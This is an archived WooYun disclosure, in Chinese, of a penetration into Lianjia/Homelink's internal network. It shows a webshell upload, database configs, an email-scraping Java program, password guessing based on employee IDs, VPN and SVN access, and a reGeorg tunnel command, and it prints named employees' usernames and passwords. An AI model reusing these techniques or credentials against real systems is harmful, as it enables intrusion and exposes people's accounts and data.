{"id": 1214, "wybug_id": "wooyun-2015-0126199", "wybug_title": "互联网房产行业之链家地产意识不足引发的内网漫游(涉及内部核心房源和销售系统\\链家理财系统\\掌上链家\\服务器数据库权限等敏感信息)", "wybug_corp": "homelink.com.cn", "wybug_author": "HackBraid", "wybug_date": "2015-07-11 21:31", "wybug_open_date": "2015-08-27 08:36", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传", "渗透测试思路", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向公众公开  简要描述： 声明：未进行任何破坏和攻击租房时链家员工的操作失误引起的内网超级大漫游员工说：怪我喽？================耐心才能搞定大目标可否精华？ 详细说明：  0x00 漫游起源去年在自如租房时，员工登录cms.ziroom.com系统，在输入账户为2009****并多次输入密码为|2009****导致可被攻击者轻易记录（可能是实习生或者第一次登录很紧张导致多次输错密码）回到家后，我也登录了下，后背一凉！自如注册、密码找回和账户提现的验证码在这里可以看到，可以任意操作了？！\n\n给他这么高的权限真的好吗？可以主站挂马了\n\n0x01 First Blood!(exam站点上传导致服务器沦陷)通过上面的2009****，密码相同即可登录http://exam.homelink.com.cn站点，这里使用20090003登录后头像可上传，啪！一句话马就上去了http://exam.homelink.com.cn/fileroot/temp/c420dc1d-9ad4-473a-b2d4-a860aec4516e/photo/x.asp;.gif keio\n\n\n\n大马：http://exam.homelink.com.cn/fileroot/offlinecourse/base/MainFrame/HY10.aspx admin找到数据库配置文件\n<?xml version=\"1.0\" encoding=\"utf-8\"?><configuration>  <configSections>    <section name=\"dataConfiguration\" type=\"newv.foundation.data.configuration.DatabaseSettings, newv.foundation.data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null\" />  </configSections>  <dataConfiguration defaultDatabase=\"SmartLearningDBConn\" />  <connectionStrings>    <add name=\"SmartLearningOraConn\" connectionString=\"Data Source=test;User Id=test;Password=test;\" providerName=\"System.Data.OracleClient\" />    <add name=\"SmartLearningDBConn\" connectionString=\"Persist Security Info=False;server=(local);User ID=smartexam;Password=***!;database=SmartExam;Connection Reset=FALSE;Packet Size=4096;Pooling=true;Max Pool Size=100;Min Pool Size=1\" providerName=\"System.Data.SqlClient\" />    <add name=\"SmartExam2007\" connectionString=\"Persist Security Info=False;server=newway;User ID=sa;Password=;database=SmartExam2007;Connection Reset=FALSE;Packet Size=4096;Pooling=true;Max Pool Size=100;Min Pool Size=1\" providerName=\"System.Data.SqlClient\" />  </connectionStrings>  <LoggingConfig>    <logMethod value=\"logNone\" description=\"记录方式: logNone-不记录. logAll-全记录. logWanted-只记录适合配置超进的Sql语句\" />    <quickSQLTime value=\"100\" deacription=\"短SQL语句的超时时长\" />    <normalSQLTime value=\"1000\" description=\"普通SQL语句的超时时长\" />    <slowSQLTime value=\"3000\" description=\"长SQL语句超时时长\" />    <databaseType value=\"mssql2005\" description=\"为数据库类型,可对值为mssql,oracle,access,mysql\" />    <isFilterScript value=\"N\" description=\"是否过滤Scirpt脚本,Y:是,N:否\" />  </LoggingConfig></configuration>\n连接数据库并找到user表，首先计算下用户数：72533\n\nselect top 10 * from nv_user where is_admin like '%Y%'\n\n\n\n本来以为是md5加密，后来发现还不是，通过解密方法可以直接获取admin密码为wumin，登录后可以进管理后台，整个链家的员工组织架构和员工工号等信息就全部暴露了！这一点很重要，将涉及到后面的mail系统沦陷、VPN内网漫游和代理反弹漫游等。\n\n0x02 企业安全软肋之邮件系统邮件系统一直是黑客的最爱，因为它包含开发和运维等职能相关的账户信息、企业核心数据相关的源码（svn、git）信息以及VPN这种直接远程入内网的账户信息等。尤其是在猪猪侠大牛提出了常用的500用户名之后以及北京方便面的经典案例 WooYun: 企业应用安全的软肋之唯品会内网漫游（DBA系统、项目管理系统等） ，这种简单粗暴直接的攻击方式往往能达到“快准狠”的效果。于是乎我也试了下链家的邮件系统，首先还是从链家主站发现2W+的经纪人的邮件信息：\n\n写个程序即可爬取所有人的邮箱，java代码如下（其中WriteToFile是个写文件的类，就不用贴了吧）：\npackage MailCatch;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.net.HttpURLConnection;import java.net.URL;import java.net.URLConnection;import java.util.ArrayList;import java.util.List;import java.util.regex.Matcher;import java.util.regex.Pattern;import WriteFiles.WriteToFile;public class MailCatch {\t/**\t * Main\t * @author libin-it\t * @since 2015/04/20\t */\tpublic static void main(String[] args) throws Exception {\t\tMailCatch mailCatch = new MailCatch();\t\tfor (int i = 2; i < 1778; i++) {\t\t\tmailCatch.doGet(\"http://bj.lianjia.com/jingjiren/pg\"+i+\"/\", \"catch\",\"C:/Users/libin-it/Desktop/homelinkmail.txt\");\t\t}\t}\t\t/**\t * @method doGet(url,action,wPath)\t * @return url(Code=200) or url(Content)\t * @throws Exception\t */\tpublic static void doGet(String u,String act,String wPath) throws Exception {\t\tURL url = new URL(u);\t\tString action = act;\t\tWriteToFile w = new WriteToFile();\t\tURLConnection connection = url.openConnection();\t\tHttpURLConnection httpURLConnection = (HttpURLConnection) connection;\t\thttpURLConnection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\t\thttpURLConnection.setRequestProperty(\"Accept-Encoding\", \"identity\");\t\thttpURLConnection.setRequestProperty(\"Content-Type\",\t\t\t\t\"application/x-www-form-urlencoded\");\t\thttpURLConnection.setReadTimeout(5000);\t\thttpURLConnection.setConnectTimeout(5000);\t\t\t\ttry{\t\tif ((httpURLConnection.getResponseCode() == 200)&&action == \"url\") {\t\t\t//写url\t\t\tw.fWriter(wPath, u);\t\t} else if((httpURLConnection.getResponseCode() == 200)&&action == \"catch\"){\t\t\t//抓mail\t\t\t\tSystem.out.println(\"Success!!!\");\t\t\tInputStream in = null;\t        InputStreamReader inr = null;\t        BufferedReader reader = null;\t        StringBuffer resultBuffer = new StringBuffer();\t        String tempLine = null;\t\t\t try{\t\t\t in = httpURLConnection.getInputStream();\t\t\t inr = new InputStreamReader(in,\"utf-8\");\t\t\t reader = new BufferedReader(inr);\t\t\t while((tempLine = reader.readLine())!=null){\t\t\t\t resultBuffer.append(tempLine);\t\t\t\t \t\t\t }\t\t\t List<String> ls=new ArrayList<String>();\t\t     Pattern pattern = Pattern.compile(\"[\\\\w[.-]]+@[\\\\w[.-]]+\\\\.[\\\\w]+\");\t\t     Matcher matcher = pattern.matcher(resultBuffer);\t\t     while(matcher.find()){\t\t    \t w.fWriter(wPath, matcher.group());\t\t    }\t\t\t }finally{\t\t\t if(reader!=null){\t\t\t reader.close();\t\t\t }\t\t\t if(inr!=null){\t\t\t inr.close();\t\t\t }\t\t\t if(in!=null){\t\t\t in.close();\t\t\t }\t\t\t }\t\t}\t}catch(Exception e){\t}}\t}\n这样单线程跑也就2分钟搞定！\n\n结果爆破使用最简单的123456，其它规则参考 WooYun: 企业应用安全的软肋之唯品会内网漫游（DBA系统、项目管理系统等） ，跑出了三条：\n\n两万才跑出3条？！还都是经纪人邮件，貌似没什么卵用，后来试了试其它规则也是收效甚微。之后有一天在想链家7W多的员工都在使用员工工号登陆exam系统，会不会其邮件系统密码也是用员工工号呢？之后的邮件VPN漫游更加明确了一条攻击思路：通过0x01获取的员工工号作为密码+邮箱系统的通讯录作为用户名就可以控制我想要的邮件信息了。====================邮件泄露信息=================首先看看核心系统研发组：\n\n通过经纪人zhaom23在通讯录里查到其邮箱账户为zhuxw4，密码是工号：20086341\n\n去重后房源是800w，然后我们搜寻git，发现一个账户\n\n无奈端口都已经关闭了\n\n研发组里掌上链家的常健changj9\\20086089JIPA系统，在内网\n\n然后知道常健是做掌上链家的研发\n\n互联网应用开发组里的李军峰lijf6|20012579（密码已改），链家理财svn账户信息泄露，也是在内网\n\n0x03 企业安全软肋之VPN系统VPN系统的爆破也成为企业安全的软肋，我们使用之前邮箱的攻击思路即可进一步测试VPN系统使用常健 changj9|20086089 可以成功登陆vpn系统重置常健的JIPA密码为123456asd（0x02邮箱获得的地址）,进入JIPA系统，发现是掌上链家项目的问题及解决这样一个系统\n\n然后登录链家核心业务之一链家理财的svn可查看源码，也可以整包下载喽？https://172.16.6.214/svn/homelinkP2P/trunk/ 账户密码为：zhouhongting|zhouhongting\n\n看数据库配置信息\n#============================##===== Database sttings =====##============================##mysql database settingjdbc.driver=com.mysql.jdbc.Driver#jdbc.url=jdbc:mysql://172.27.30.231:3306/p2p?useUnicode=true&characterEncoding=utf-8jdbc.url=jdbc:mysql://172.16.5.15:3306/p2p?useUnicode=true&characterEncoding=utf-8jdbc.username=thinkgemjdbc.password=admin#oracle database settings#jdbc.driver=oracle.jdbc.driver.OracleDriver#jdbc.url=jdbc:oracle:thin:@127.0.0.1:1521:orcl#jdbc.username=jeesite#jdbc.password=123456#mssql database settings#jdbc.driver=net.sourceforge.jtds.jdbc.Driver#jdbc.url=jdbc:jtds:sqlserver://localhost:1433/jeesite#jdbc.username=sa#jdbc.password=sa#pool settingsjdbc.pool.minIdle=3jdbc.pool.maxActive=20\n连接数据库\n\n还有个redis未授权访问，现在可以直接拿shell\n\n另外一个VPN账户为王楚中：wangcz_v|wangcz_v（密码已改）--》密码已改不可怕，请看后面的突破VPN限制。由于王楚中身份是北京链家-职能-资讯科技本部-系统运维部-系统架构组，所以登录VPN后其管理的系统是最全面的\n\n====================VPN漫游=================可以登录eoffice，进而可以了解链家很多业务站点：\n\n链家核心销售管理系统（172.16.5.55）存在高危设计缺陷http://sestg.homelink.com.cn/SalesMgr-Web/framelayout.action?SSOUserName=$xiongym$其中$xiongym$部分替换为任意经纪人的邮箱前缀即可登录（之前已经使用程序批量获取2W+经纪人账户）这个系统可以直接查看该经纪人所管小区域的房主信息\n\n\n\n业主联系方式\n\n0x04 突破VPN限制http://apisms.test.ziroom.com admin|admin tomcat弱口令可上传war包传个reGeorgSockets的tunnel.jsp\npython reGerSocksProxy.py -p 8090 -u \"http://apisms.test.ziroom.com/SMS2APP/test/index.jsp\"\n即可再次登录核心销售管理系统\n\n\n\n\n\n\n\n   漏洞证明：  exam系统在内网也可以ping通核心销售系统\n\n写了一下午+一晚上，求个精华~   修复方案：  1.exam、mail和VPN等系统密码口令策略修改2.内网核心销售系统源码整改，现在是用户名登录。   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-13 08:35 厂商回复： 确认，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-11 22:51 |    \t\tdiguoji \t\t\t( 普通白帽子  |\t\t\t        Rank:323 漏洞数:79        | 中国吉林长春)\t\t \n  眼睛是真好使    \n     2015-07-12 02:33 |    \t\tago \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:56        | long long ago,I am a bird.)\t\t \n  猜测看见了个密码    \n     2015-07-12 08:44 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @ago 差不多，个人觉得危害挺大的，竟然没雷——！    \n     2015-07-20 22:46 |    \t\t泪雨无魂 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:32        )\t\t \n  标题好长。。。。    \n     2015-08-27 13:23 |    \t\t默之 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:67        | 沉淀。)\t\t \n  厉害    \n     2015-08-27 13:35 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @默之 - -!还是你厉害    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}